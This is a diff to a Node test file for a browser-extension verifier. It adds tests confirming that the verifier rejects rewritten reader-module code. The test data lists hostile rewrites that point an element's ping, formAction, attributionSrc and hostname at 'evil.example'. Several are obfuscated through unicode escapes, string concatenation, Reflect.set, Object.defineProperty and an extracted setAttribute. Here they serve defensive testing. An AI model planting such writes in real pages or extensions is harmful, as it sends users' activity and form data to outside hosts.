@@ -5,7 +5,7 @@ import { cpSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, syml
 import { join } from "node:path";
 import { tmpdir } from "node:os";
 import { runNode } from "../scripts/test-cli.mjs";
-import { scanSource, checkManifest, checkProbeDir, attackSelfTest, authorLinkSelfTest, urlMutationSelfTest, authorBoundarySelfTest, destructuringSelfTest } from "../scripts/verify.mjs";
+import { scanSource, checkManifest, checkProbeDir, attackSelfTest, authorLinkSelfTest, urlMutationSelfTest, authorBoundarySelfTest, destructuringSelfTest, resourcePropertySelfTest } from "../scripts/verify.mjs";
 import { allowedRequest, hasExtensionInitiator } from "../scripts/network-policy.mjs";
 await import("../probe/reader.js");
 const R = globalThis.XSCHED_READER;
@@ -30,6 +30,10 @@ test('author boundary rejects 28 fake-document, changed-call and changed-source 
 
 test('destructuring guard rejects 158 nested assignment, loop, default and binding attacks', () => {
   assert.equal(destructuringSelfTest(), 158);
+});
+
+test('resource guard rejects 514 aligned attribute/IDL writes and preserves safe reads/styles', () => {
+  assert.equal(resourcePropertySelfTest(), 514);
 });
 
 test("privacy self-test actually fails when skeleton or time masking leaks", () => {
@@ -248,7 +252,7 @@ test('verify CLI rejects URL mutation and factory substitution before executing 
   } finally { rmSync(directory, { recursive: true, force: true }); }
 });
 
-test('full repo verify CLI rejects pointerover URL rewrites in an unlocked reader module', () => {
+test('full repo verify CLI rejects 18 pointerover URL/resource rewrites in an unlocked reader module', () => {
   const directory = mkdtempSync(join(tmpdir(), 'xsched-nested-repo-'));
   const root = new URL('../', import.meta.url);
   try {
@@ -263,18 +267,34 @@ test('full repo verify CLI rejects pointerover URL rewrites in an unlocked reade
     const baseline = runNode([cli], { timeout:10000 });
     assert.equal(baseline.status, 0, baseline.stdout + baseline.stderr);
     assert.match(baseline.stdout, /158 destructuring self-tests/);
+    assert.match(baseline.stdout, /514 resource property self-tests/);
     const readerPath = join(directory, 'probe/reader.js');
     const original = readFileSync(readerPath, 'utf8');
-    for (const rewrite of [
-      "({first: author.search, second: {value: other}} = {first: '?x=1', second: {value: 0}});",
-      "({first: author.hostname, second: {value: other}} = {first: 'evil.example', second: {value: 0}});",
-      "for ({first: author.search, second: {value: other}} of [{first:'?x=1', second:{value:0}}]) {}\nfor ({first: author.hostname, second: {value: other}} of [{first:'evil.example', second:{value:0}}]) {}",
+    for (const [rewrite, rule] of [
+      ["({first: author.search, second: {value: other}} = {first: '?x=1', second: {value: 0}});", 'destructuring member access'],
+      ["({first: author.hostname, second: {value: other}} = {first: 'evil.example', second: {value: 0}});", 'destructuring member access'],
+      ["for ({first: author.search, second: {value: other}} of [{first:'?x=1', second:{value:0}}]) {}\nfor ({first: author.hostname, second: {value: other}} of [{first:'evil.example', second:{value:0}}]) {}", 'destructuring member access'],
+      ["author.ping = 'https://evil.example/ping';", 'resource property write'],
+      ["author['\\u0070ing'] = 'https://evil.example/ping';", 'resource property write'],
+      ["author['pi' + 'ng'] = 'https://evil.example/ping';", 'resource property write'],
+      ["Reflect.set(author, 'ping', 'https://evil.example/ping');", 'reflective property mutation/extraction'],
+      ["Object.assign(author, {ping: 'https://evil.example/ping'});", 'reflective property mutation/extraction'],
+      ["Object.defineProperty(author, 'ping', {value: 'https://evil.example/ping'});", 'reflective property mutation/extraction'],
+      ["({first: author.ping, second: {value: other}} = {first: 'https://evil.example/ping', second: {value: 0}});", 'destructuring member access'],
+      ["author.attributionSrc = 'https://evil.example/report';", 'resource property write'],
+      ["author.formAction = 'https://evil.example/submit';", 'resource property write'],
+      ["author.srcdoc = '<p>synthetic</p>';", 'resource property write'],
+      ["author.referrerPolicy = 'unsafe-url';", 'resource property write'],
+      ["author.background = 'https://evil.example/background';", 'resource property write'],
+      ["const write = author.setAttribute; write.call(author, 'ping', 'https://evil.example/ping');", 'dynamic/extracted attribute mutation'],
+      ["author.setAttribute.call(author, 'ping', 'https://evil.example/ping');", 'dynamic/extracted attribute mutation'],
+      ["const name = 'ping'; author.setAttribute(name, 'https://evil.example/ping');", 'dynamic/extracted attribute mutation'],
     ]) {
       const handler = `\ndocument.addEventListener('pointerover', event => {\n  const host = document.querySelector('#xsched-probe-root');\n  const author = host?.shadowRoot?.querySelector('.panel-author');\n  if (!author) return;\n  let other;\n  ${rewrite}\n});\n`;
       writeFileSync(readerPath, original + handler);
       const result = runNode([cli], { timeout:10000 });
       assert.equal(result.status, 1, result.stdout + result.stderr);
-      assert.match(result.stderr, /probe\/reader\.js: destructuring member access forbidden/);
+      assert.ok(result.stderr.includes(`probe/reader.js: ${rule} forbidden`), result.stderr);
       assert.doesNotMatch(result.stderr, /differs from reviewed source|SELF-TEST FAILED/);
       // The top-level pure-module import must be skipped before running the
       // malicious handler module; no global DOM exists in this CLI process.
